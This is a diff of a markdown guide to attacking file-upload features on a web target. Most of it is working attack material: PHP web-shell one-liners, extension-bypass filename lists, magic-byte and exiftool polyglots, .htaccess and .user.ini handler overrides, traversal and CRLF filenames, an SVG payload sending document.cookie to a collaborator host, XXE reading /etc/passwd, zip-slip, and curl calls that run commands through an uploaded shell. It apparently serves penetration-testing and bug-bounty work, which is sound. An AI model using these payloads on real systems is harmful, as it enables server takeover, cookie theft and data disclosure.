@@ -1,71 +1,107 @@
 # HOW TO TEST FILE UPLOAD ON A TARGET (2026 expert guide)
 > **Author:** MD MAHABUBUR RAHMAN
 
-## The N ways to test
-1. Extension bypass: .php  .php5 .phtml  .phar  .asp  .aspx  .jsp(.jspx) .sh .py .cgi;  case: .PhP;  dots: .php.  ;  spaces: "file.php ".  double ext: .php.jpg.  null: .php%00.jpg.
-2. MIME/magic: upload with Content-Type text/html while body is a PHP shell; match magic bytes by prepending GIF89a; craft polyglot files.
-3. Content sniffing: file  upload that ends up served as HTML (svg, xhtml, html, svgz?) - stored XSS with cookies.
-4. SVG upload: XSS + XXE (image/xml parse).
-5. Tika/Zero.py path traversal rename: filename=../../../../var/www/html/shell.php.
-6. RCE via parsers: .phar deserialization, zip archive zip-slip, XML with external entities, image libs with CVEs.
-7. Filename -> header injection (CRLF in name), stored XSS when filename echoed.
-8. Access-control on the file: uploaded files fetchable by others (IDOR on /uploads/uuid).
-9. Double extension backend: .php.jpg passed by check for .jpg then executed by .php worker.
-10. Whitelist UT+oc: check what the SERVER executes (extension) not what UI displays.
+## Step 0 — Recon the upload surface
+1. Login, locate every upload: **avatar, profile pic, cover, document, CSV/import, attachment, media library, signature, invoice, ZIP/theme/plugin import**.
+2. Upload a benign file → note **storage path** and **URL pattern** (`/uploads/<id>`, `/uploads/2026/01/filename`, `/media/uuid`).
+3. Observe **served Content-Type** of the uploaded file and whether a filename rewrite happened (sanitizer present? random name = harder traversal).
 
-## Step-by-step on target
-1. Login, locate upload (avatar, document, import, cover, profile pic "file").
-2. Try benign -> observe: storage path, URL pattern (/uploads/<id>), content-type served.
-3. Extension ladder: php7 .phtml.jpg etc. Watch for 200 + execution attempt in response (execute: phpinfo via image).
-4. Then confirm EXEC search: request a created file (e.g. shell.php) and check content type + response code.
-5. If no direct exec, test polyglot/html+svg for stored XSS and XML-based XXE.
-6. IDOR the file (src param) - permalinks often guessable.
-7. Look at response header / uploading again to see filename rewritten (sanitizer that encodes dots=broken, missing = exploitable).
+## Step 1 — Extension ladder (the #1 path to RCE)
+Check filename against the **server-side extension** it actually executes — not the extension the UI shows.
+```
+shell.php        -> "Invalid type"?  (blocked = whitelist/blacklist exists)
+shell.phtml      -> try
+shell.php5       -> try
+shell.phar       -> try
+shell.pht        -> try
+shell.php7       -> try
+shell.php%00.png -> null byte (legacy PHP/Apache)
+shell.php.       -> trailing dot (Windows Apache parse bug)
+shell.php        -> trailing space
+shell.pHp        -> case (case-insensitive filesystem / case-sensitive filter)
+shell.php.jpg    -> double extension (filter strips last ext, Apache runs first)
+shell.jpg.php    -> reverse double ext (filter checks first, Apache runs last)
+shell.php.jpg.png-> allow-pass chain
+shell.php::$DATA -> NTFS alternate data stream (Windows)
+```
+The **undeniable test**: does requesting the file *execute* it? `200 + code output = RCE`.
 
-## Bypass ladder (server-side is final judge)
-Extension case -> %00 -> double ext -> trailing dot/space -> double extension depends on Apache handlers:
-   php.cgi, php5.shtml in some configs; htaccess enable overrides.
-The undeniable test: does requesting the file EXECUTE it (phpinfo in body, 200 vs 500).
+## Step 2 — MIME / magic-byte / polyglot
+- If server checks **Content-Type only**: send `Content-Type: image/png` with a PHP body.
+- If server checks **magic bytes only**: prepend a real signature then PHP tail:
+  ```
+  GIF89a;<?php system($_GET['c']); ?>
+  \xff\xd8\xff\xe0 ... <?php ... ?>       (JPEG)
+  \x89PNG\r\n\x1a\n ... <?php ... ?>      (PNG)
+  ```
+- **exiftool polyglot** (valid image with PHP in EXIF comment, then craft):
+  ```
+  exiftool -Comment='<?php system($_GET["c"]); ?>' evil.jpg
+  ```
+- If polyglot won't execute standalone, chain via **LFI** to include it.
 
-## False positives
-- Upload succeeds but file stored as .txt and served as text = no RCE, still stored-content risk.
-- Polyglot that never runs = no XSS.
-- Filename sanitized properly (random name) = no traversal.
+## Step 3 — Config-file drop (silent RCE on writable parents)
+Only if upload lands in a directory *above* or *equal to* where code runs:
+```
+.htaccess  ->  AddType application/x-httpd-php .png
+.htaccess  ->  <FilesMatch ".*\.ph.*"> SetHandler php5-script </FilesMatch>
+.user.ini  ->  auto_prepend_file = shell.png.png
+```
+Then upload `shell.png` containing PHP → include runs it.
 
-## Tools
-- Burp upload fuzzer, magicbytes cheatsheet, muff-dataris, ExifTool, Vincent (upload parser).
+## Step 4 — Filename → traversal / header / stored XSS
+```
+../../../../var/www/html/shell.php      (path traversal rename)
+shell.php%0d%0aX-Injected: yes          (CRLF header injection in filename echo)
+<script>alert(1)</script>.png           (stored XSS via filename reflection)
+shell.php%252e.png                      (double-encoded dot)
+shell.jpg;.php                          (semicolon — Windows/older .NET)
+shell.php\t.txt                         (tab)
+```
+Watch response headers + JSON: a **rewritten filename** (dots encoded) = harder; **unchanged** = exploitable.
 
-## WORKED EXAMPLES (concrete)
-A. Extension ladder (avatar upload):
-file="shell.php"            ->  "Invalid type" (blocked)
-file="shell.phtml"          ->  try
-file="shell.php5"           ->  try
-file="shell.php%00.png"     ->  null-byte (older PHP/Apache)
-file="shell.php."           ->  trailing dot (Windows Apache parse)
-file="shell.php "           ->  trailing space
-file="shell.pHp"            ->  case
-file="shell.php.jpg"        ->  double extension
-file="shell.php.jpg.png"    ->  allow-pass chain
-B. Magic-byte polyglot (cat gif header + php code):
-echo -n "GIF89a<?php system(\$_GET['c']); ?>" > shell.php
-change Content-Type of the POST part to image/gif
-C. SVG stored XSS:
-upload:  data:image/svg+xml,<svg onload="fetch('//YOUR-COLLABORATOR/?c='+document.cookie)">
-then access the uploaded /uploads/x.svg (server serves text/html-ish mime)
-D. XXE in SVG/office doc:
+## Step 5 — Stored XSS / SVG
+```
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//COLLABORATOR/?c='+document.cookie)">
+<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>
+<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://COLLABORATOR/x"/></svg>
+```
+SVG served as `image/svg+xml` but rendered in an `<img>` → still executes **on link via top-nav / viewer page**. SVG with `<image xlink:href>` = blind SSRF probe.
+
+## Step 6 — XXE in SVG / OOXML / PDF
+```
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-<image xlink:href="file:///etc/passwd"/>
+  <image xlink:href="file:///etc/passwd"/>
 </svg>
-E. Path traversal rename:
-curl -F "file=@shell.php;filename=../../../../var/www/html/shell.php" \
--F "mime=image/png" http://target.com/upload
-F. Zip-slip (extract zip server-side):
-craft zip with entry name "../../evil.php"
+```
 
-## EXECUTION CONFIRM
-The REAL test is whether requesting the file runs code, not just storage:
+## Step 7 — IDOR / access control on the uploaded file
+- Enumerate `/uploads/12345`, `/files/uuid`, `/media/<id>`.
+- If file URLs are guessable → **IDOR** (download others' private files).
+
+## Step 8 — Zip-slip / zip-bomb (import/theme/zip endpoints)
+- Zip-slip: entry named `../../../../tmp/evil.php` → extract writes outside the dir.
+- Zip-bomb: highly-compressed file → decompression bomb on server extract.
+
+## Confirm execution (never assume — PROVE it)
 ```
-curl -i "https://target.com/uploads/shell.php" | grep -i "x-powered-by\|200"   # 200 + php = RCE
-IDOR the uploaded file via /uploads/<guessable-id>:
-curl -i "https://target.com/files/12345"
+curl -i "https://target.com/uploads/shell.php?c=id" | grep -i "200\|x-powered-by"
+GET /uploads/2026/01/shell.php?0=id
+GET /wp-content/uploads/2026/01/shell.php?cmd=id
+GET /upload/shell.php?c=id
 ```
+
+## False positives (don't over-report)
+- Upload succeeds but stored as `.txt` and served as `text/plain` → **no RCE**, still stored-content risk.
+- Polyglot never executes (no LFI) → no RCE, may still be XSS/XXE.
+- Filename fully sanitized to a random name → no traversal.
+- `200` on a static fallthrough page ≠ execution — grep body for your echo.
+
+## Worked mini-example (avatar upload)
+```
+curl -F "file=@shell.php;type=image/png" https://target.com/upload
+# observe stored name + serve:
+webshell.php -> served text? -> no PHP handler -> pivots:
+  1) .htaccess drop, 2) LFI include, 3) SVG stored XSS instead.
+```
+Only run against authorized, in-scope targets.
